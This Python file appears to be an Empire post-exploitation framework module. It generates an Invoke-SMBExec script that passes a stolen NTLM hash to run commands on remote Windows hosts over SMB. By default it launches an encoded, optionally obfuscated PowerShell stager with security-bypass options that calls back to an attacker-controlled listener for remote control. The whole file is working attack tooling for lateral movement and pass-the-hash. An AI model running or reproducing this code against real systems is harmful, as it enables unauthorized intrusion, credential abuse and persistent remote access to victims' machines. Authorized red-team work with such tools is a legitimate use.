from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # staging options
        listener_name = params['Listener']
        command = params['Command']
        computer_name = params['ComputerName']
        user_name = params['Username']
        ntlm_hash = params['Hash']
        domain = params['Domain']
        service = params['Service']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            launcher_obfuscate = True
        else:
            launcher_obfuscate = False
        launcher_obfuscate_command = params['ObfuscateCommand']

        # Only "Command" or "Listener" but not both
        if (listener_name == "" and command  == ""):
            return handle_error_message("[!] Listener or Command required")
        if (listener_name and command):
            return handle_error_message("[!] Cannot use Listener and Command at the same time")

        # read in the common module source code
        script, err = main_menu.modules.get_module_source(module_name=module.script_path, obfuscate=obfuscate, obfuscate_command=obfuscation_command)
        
        if err:
            return handle_error_message(err)

        if not main_menu.listeners.is_listener_valid(listener_name) and not command:
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)

        elif listener_name:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listenerName=listener_name,
                                                           language='powershell',
                                                           encode=True,
                                                           userAgent=user_agent,
                                                           obfuscate=launcher_obfuscate,
                                                           obfuscationCommand=launcher_obfuscate_command,
                                                           proxy=proxy,
                                                           proxyCreds=proxy_creds,
                                                           bypasses=params['Bypasses'])

            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")

            Cmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher

        else:
            Cmd = '%COMSPEC% /C start /b ' + command
            print(helpers.color("[*] Running command:  " + Cmd))

        script_end = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computer_name, user_name, domain, ntlm_hash, Cmd)
        outputf = params.get("OutputFunction", "Out-String")
        script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'

        script = main_menu.modules.finalize_module(script=script, script_end=script_end, obfuscate=obfuscate, obfuscation_command=obfuscation_command)
        return script
